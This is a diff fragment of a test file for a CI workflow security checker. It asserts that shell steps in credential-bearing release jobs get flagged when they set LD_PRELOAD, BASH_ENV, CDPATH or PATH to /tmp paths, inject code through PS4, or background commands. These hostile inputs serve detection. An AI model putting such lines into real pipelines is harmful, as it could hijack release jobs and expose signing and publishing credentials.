+		["env prefix", "env PATH=/tmp aws s3 ls", /modifies PATH|runs env, a wrapper/],
+	];
+	for (const [label, script, pattern] of cases) {
+		const reasons = credentialStepReasons(script, options);
+		assert.ok(reasons.some((reason) => pattern.test(reason)), `${label}: expected ${pattern}, got:\n${reasons.join("\n")}`);
+	}
+	// The workflow-level check reaches every credential-bearing job, using the plain-assignment
+	// forms that round 5 let through.
+	for (const jobId of ["publish-r2", "finalize-release", "publish-beta-r2", "github-release", "github-release-beta", "publish-npm", "tap-bump", "sign"]) {
+		for (const [script, pattern] of [["LD_PRELOAD=/tmp/x.so", /sets LD_PRELOAD/], ["BASH_ENV=/tmp/x.sh", /sets BASH_ENV/], ["CDPATH=/tmp", /sets CDPATH/], ["PS4='$(python3 -c 1)'\nset -x", /sets PS4/], ["coproc worker { python3 -c 1; }", /runs coproc, a wrapper/], ["sleep 1 &\nwait", /runs a command in the background/]]) {
+			const broken = mutate(RELEASE, (text) => appendStep(text, jobId, runStep("Sneak in a setup", `set -euo pipefail\n${script}`)));
+			const problems = checkWorkflows(reader({ [RELEASE]: broken }));
+			assert.ok(problems.some((problem) => problem.includes(`'${jobId}'`) && pattern.test(problem)), `${script} in ${jobId}:\n${problems.join("\n")}`);
+		}
+	}
+	// What the checked-in jobs do stays accepted: IFS on a read, a function with a private name, `wait` on nothing.
+	for (const fine of ["while IFS=$'\\t' read -r name digest; do echo \"$name\"; done < artifacts/SHA256SUMS", "helper() { echo x; }\nhelper", "command -v aws", "wait"]) {
+		assert.deepEqual(credentialStepReasons(fine, options), [], fine);
+	}
+	// The parser marks exactly the backgrounded command.
+	const parsed = [...shellCommands("aws s3 ls &\nwait\necho a && echo b\ntrue | false")];
+	assert.deepEqual(parsed.map((command) => command.background), [true, false, false, false, false, false]);
+	assert.deepEqual(checkWorkflows(), []);
 });
